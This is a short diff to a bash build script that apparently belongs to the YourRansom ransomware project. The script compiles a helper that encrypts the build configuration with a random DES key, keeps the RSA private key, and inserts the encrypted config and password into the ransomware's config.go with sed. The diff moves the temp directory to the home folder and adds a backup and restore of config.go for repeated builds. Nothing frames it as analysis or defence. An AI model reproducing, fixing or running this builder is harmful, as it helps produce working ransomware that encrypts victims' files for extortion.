@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 
-TMP_DIR=/tmp/yr1k
+TMP_DIR=~/.yr1k/
 mkdir -p ${TMP_DIR}
 
 msg() {
@@ -44,12 +44,17 @@ args=$(cat args)
 
 go build -o config.o main.go
 chmod a+x config.o
-./config.o ${args} -desKey ${rand_str}
+./config.o ${args} -desKey ${rand_str} > data.enc
 )
 cp ${TMP_DIR}/private.pem ./YourRansom.private
 config=$(cat ${TMP_DIR}/data.enc)
 
 YRPATH=${GOPATH}/src/github.com/YourRansom/YourRansom/
+if [ ! -f "${YRPATH}/config.go.bak" ]; then
+    cp -f ${YRPATH}/config.go ${YRPATH}/config.go.bak
+else
+    cp -f ${YRPATH}/config.go.bak ${YRPATH}/config.go
+fi
 sed -i "s/YOUR_CONFIG/${config}/" ${YRPATH}/config.go
 sed -i "s/YOUR_PW/${rand_str}/" ${YRPATH}/config.go
 
